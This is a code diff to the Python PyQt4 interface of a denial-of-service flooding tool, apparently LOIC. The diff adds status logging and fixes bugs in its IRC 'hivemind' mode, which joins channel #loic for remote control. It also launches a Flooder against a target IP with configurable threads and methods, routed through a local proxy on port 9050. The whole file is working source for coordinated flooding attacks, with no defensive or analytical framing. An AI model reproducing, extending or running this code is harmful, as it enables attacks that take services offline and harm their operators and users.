@@ -1,5 +1,6 @@
 import sys, time
 
+
 from PyQt4.QtGui import *
 from PyQt4.QtCore import *
 
@@ -7,16 +8,20 @@ from Core.Events import *
 from Core.IRC import * 
 from Core.Flooder import *
 from Core.Globals import *
+from Core.Log import *
+
 
 class hivemindTab(QWidget):
 
     def __init__(self):
         QWidget.__init__(self)
 
-        self.server = QLineEdit("irc.hiddenaces.net")
+        self.server = QLineEdit("")
         self.port = QLineEdit("6667")
         self.port.setValidator(QIntValidator())
         self.channel = QLineEdit("#loic")
+
+        self.text = QLabel("Offline")
 
         self.start = QPushButton("join")
 
@@ -32,10 +37,14 @@ class hivemindTab(QWidget):
         layout.addWidget(self.channel, 2, 1)
 
         layout.addWidget(self.start, 3, 0, 1, 4)
-
+        layout.addWidget(self.text, 4, 0 )
         self.setLayout(layout)
         self.setMinimumSize(200, 200)
         self.show()
+
+
+    def log(self,text):
+        self.text.setText(text)
 
 class manualTab(QWidget):
 
@@ -144,7 +153,7 @@ class main(QMainWindow):
 
     def __init__(self):
         QMainWindow.__init__(self)
-
+    
         self.irc = None
         self.flooder = None
 
@@ -189,10 +198,16 @@ class main(QMainWindow):
         if self.flooder:
             self.flooder.stop()
         if self.irc:
+            self.log('Disconnecting...')
             self.irc.stop()
+            self.log('Offline')
         getEventManager().stop()
 
+    def log(self,text):
+        self.defTab.log(text)
+
     def hivemindStart(self):
+        self.log('Logging in')
         if self.irc != None:
             msgBox = QMessageBox();
             msgBox.setText("Hivemind is already running.")
@@ -201,7 +216,6 @@ class main(QMainWindow):
             else:
                 msgBox.setInformativeText("Do you want to change server?")
             msgBox.setStandardButtons(QMessageBox.Ok | QMessageBox.Cancel)
-            msgBox.sethivemindButton(QMessageBox.Cancel)
             ret = msgBox.exec_()
 
             if ret == QMessageBox.Cancel:
@@ -211,11 +225,13 @@ class main(QMainWindow):
                 self.channel = str(self.defTab.channel.text())
                 self.irc.changeChannel(str(self.defTab.channel.text()))
             else:
-                irc.disconnect()
-                irc.host = str(self.defTab.server.text())
-                irc.port = int(self.defTab.port.text())
-                irc.channel = str(self.defTab.channel.text())
-                irc.connect()
+                self.irc.disconnect()
+                self.irc.host = str(self.defTab.server.text())
+                self.irc.port = int(self.defTab.port.text())
+                self.irc.channel = str(self.defTab.channel.text())
+                self.log('Connecting')
+                self.irc.connect()
+                self.log('Online')
 
         self.server = str(self.defTab.server.text())
         self.port = int(self.defTab.port.text())
@@ -223,6 +239,11 @@ class main(QMainWindow):
 
         if self.irc == None:
             self.irc = IRC(self.server, self.port, self.channel)
+            self.irc.online_hook = self.is_online
+
+
+    def is_online(self):
+        self.log('Online')
 
     def manualStart(self):
         tab = self.manTab
@@ -356,37 +377,42 @@ class main(QMainWindow):
                         self.srcport = srcport
 
         if self.status == START:
+            self.log('Flood')
             event = Event(START_LAZER, None)
             getEventManager().signalEvent(event)
         else:
             self.status = WAITING
 
     def lazerStartHook(self, event):
-        print "starting lazor"
+        self.log( "starting lazor" )
         if self.status == START:
             if self.flooder != None:
                 self.flooder.stop()
 
             if self.targetip == None or self.port == None:
-                print "no target set"
+                self.log( "no target set")
                 return
 
             if self.timeout == None:
-                print "Missing required timeout"
+                self.log("Missing required timeout")
                 return
             if len(self.method) == 0:
-                print "Missing required method"
+                self.log("Missing required method")
                 return
             if self.threads == None:
-                print "Missing required thread amount"
+                self.log( "Missing required thread amount")
                 return
+
+            self.log('Begin Flood')
 
             self.flooder = Flooder(self.targetip, self.port, self.timeout, self.method, self.threads, self.subsite, self.message, self.random, self.wait, self.srchost, self.srcport, "127.0.0.1", 9050)
             self.flooder.start()
 
     def restartIRCHook(self, event):
         time.sleep(5)
+        self.log('Reconnecting')
         irc.connect()
+        self.log('Online')
 
         
 
